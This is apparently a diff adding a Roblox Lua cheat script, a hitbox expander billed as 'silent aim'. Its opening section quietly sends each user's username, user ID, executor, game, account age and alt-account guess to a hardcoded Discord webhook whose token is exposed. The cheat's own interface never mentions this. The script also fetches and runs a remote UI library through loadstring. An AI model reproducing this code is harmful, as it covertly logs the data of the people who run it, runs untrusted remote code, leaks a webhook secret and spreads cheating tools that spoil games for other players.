@@ -1,0 +1,231 @@
+-- Webhook Configuration
+local Webhook = "https://discord.com/api/webhooks/1311627929045958747/VOMfqhVNzVyKA0XUWp8qZ4RQGKK7yYP59kjArKhTkrvVI8yR8KLYoofMj7UPLH90LBaQ" -- your webhook
+_G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.
+
+-- Player Information Collection
+local player = game:GetService("Players").LocalPlayer
+local joinTime = os.time() - (player.AccountAge * 86400)
+local joinDate = os.date("!*t", joinTime)
+local premium = false
+local alt = true
+if player.MembershipType == Enum.MembershipType.Premium then
+   premium = true
+end
+
+if player.AccountAge <= 365 then
+    alt = "Possible"
+elseif player.AccountAge >= 365 and premium == true then
+    alt = "No"
+else
+   alt = "Maybe"
+end
+
+local executor = identifyexecutor() or "Unknown"
+local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
+Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
+local AvatarImage = Thing.imageUrl
+
+-- Prepare Webhook Message
+local msg = {
+   ["username"] = "ex0 script logger",
+   ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
+   ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("<@".._G.Discord_UserID..">") or " ",
+   ["embeds"] = {
+       {
+           ["color"] = tonumber(tostring("0x32CD32")), --decimal
+           ["title"] = "This guy executed your script.",
+           ["thumbnail"] = {
+               ["url"] = AvatarImage,
+           },
+           ["fields"] = {
+                {
+                   ["name"] = "Username",
+                   ["value"] = "||"..player.Name.."||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Display Name",
+                   ["value"] = player.DisplayName,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "UID",
+                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Game Id",
+                   ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Game Name",
+                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Executor Used",
+                   ["value"] = executor,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Alt",
+                   ["value"] = alt,
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Account Age",
+                   ["value"] = player.AccountAge.." Day(s)",
+                   ["inline"] = true
+                },
+                {
+                   ["name"] = "Date Joined",
+                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
+                   ["inline"] = true
+                },
+           },
+           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
+       }
+   }
+}
+
+-- Send Webhook Request
+request = http_request or request or HttpPost or syn.request
+request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
+
+-- Credits and Information
+--[[ 
+Open source
+Made by !vcsk0#1516
+Credits to the Owner Who Made The ESP Script
+]]
+
+-- Core Script for Modifications
+local CoreGui = game:GetService("StarterGui")
+local Players = game:GetService("Players")
+
+-- Function to check if a string is a number
+local function isNumber(str)
+  if tonumber(str) ~= nil or str == 'inf' then
+    return true
+  end
+end
+
+-- Settings
+getgenv().HitboxSize = 15
+getgenv().HitboxTransparency = 0.9
+getgenv().HitboxStatus = false
+getgenv().TeamCheck = false
+getgenv().Walkspeed = game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed
+getgenv().Jumppower = game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower
+getgenv().TPSpeed = 3
+getgenv().TPWalk = false
+
+-- UI Library
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/UI-Library/main/Source/MyUILib(Unamed).lua"))()
+local Window = Library:Create("Hitbox/Silent aim | made by ex0")
+
+local ToggleGui = Instance.new("ScreenGui")
+local Toggle = Instance.new("TextButton")
+
+ToggleGui.Name = "ToggleGui_HE"
+ToggleGui.Parent = game.CoreGui
+
+Toggle.Name = "Toggle"
+Toggle.Parent = ToggleGui
+Toggle.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
+Toggle.BackgroundTransparency = 0.660
+Toggle.Position = UDim2.new(0, 0, 0.454706937, 0)
+Toggle.Size = UDim2.new(0.0650164187, 0, 0.0888099447, 0)
+Toggle.Font = Enum.Font.SourceSans
+Toggle.Text = "Toggle"
+Toggle.TextScaled = true
+Toggle.TextColor3 = Color3.fromRGB(40, 40, 40)
+Toggle.TextSize = 24.000
+Toggle.TextXAlignment = Enum.TextXAlignment.Left
+Toggle.Active = true
+Toggle.Draggable = true
+Toggle.MouseButton1Click:connect(function()
+    Library:ToggleUI()
+end)
+
+-- UI Tabs and Settings
+local HomeTab = Window:Tab("Home","rbxassetid://10888331510")
+local PlayerTab = Window:Tab("Players","rbxassetid://12296135476")
+local VisualTab = Window:Tab("Visuals","rbxassetid://12308581351")
+
+HomeTab:InfoLabel("only works on some games!")
+
+HomeTab:Section("Settings")
+HomeTab:TextBox("Hitbox Size", function(value)
+    getgenv().HitboxSize = value
+end)
+
+HomeTab:TextBox("Hitbox Transparency", function(number)
+    getgenv().HitboxTransparency = number
+end)
+
+-- Main Settings
+HomeTab:Section("Main")
+HomeTab:Toggle("Status: ", function(state)
+	getgenv().HitboxStatus = state
+    game:GetService('RunService').RenderStepped:connect(function()
+		if HitboxStatus == true and TeamCheck == false then
+			for i,v in next, game:GetService('Players'):GetPlayers() do
+				if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+					pcall(function()
+						v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
+						v.Character.HumanoidRootPart.Transparency = HitboxTransparency
+						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
+						v.Character.HumanoidRootPart.Material = "Neon"
+						v.Character.HumanoidRootPart.CanCollide = false
+					end)
+				end
+			end
+		elseif HitboxStatus == true and TeamCheck == true then
+			for i,v in next, game:GetService('Players'):GetPlayers() do
+				if game:GetService('Players').LocalPlayer.Team ~= v.Team then
+					pcall(function()
+						v.Character.HumanoidRootPart.Size = Vector3.new(HitboxSize, HitboxSize, HitboxSize)
+						v.Character.HumanoidRootPart.Transparency = HitboxTransparency
+						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
+						v.Character.HumanoidRootPart.Material = "Neon"
+						v.Character.HumanoidRootPart.CanCollide = false
+					end)
+				end
+			end
+		else
+		    for i,v in next, game:GetService('Players'):GetPlayers() do
+				if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+					pcall(function()
+						v.Character.HumanoidRootPart.Size = Vector3.new(2,2,1)
+						v.Character.HumanoidRootPart.Transparency = 1
+						v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Medium stone grey")
+						v.Character.HumanoidRootPart.Material = "Plastic"
+						v.Character.HumanoidRootPart.CanCollide = false
+					end)
+				end
+			end
+		end
+	end)
+end)
+
+HomeTab:Toggle("Team Check", function(state)
+    getgenv().TeamCheck = state
+end)
+
+HomeTab:Button("Reset Hitbox", function()
+    game:GetService('RunService').RenderStepped:connect(function()
+        for i,v in next, game:GetService('Players'):GetPlayers() do
+            if v.Name ~= game:GetService('Players').LocalPlayer.Name then
+                pcall(function()
+                    v.Character.HumanoidRootPart.Size = Vector3.new(2,2,1)
+                    v.Character.HumanoidRootPart.Transparency = 1
+                    v.Character.HumanoidRootPart.BrickColor = BrickColor.new("Medium stone grey")
+                    v.Character.HumanoidRootPart.Material = "Plastic"
+                    v.Character.HumanoidRootPart.CanCollide = false
+                end)
+            end
+        end
+    end)
+end)
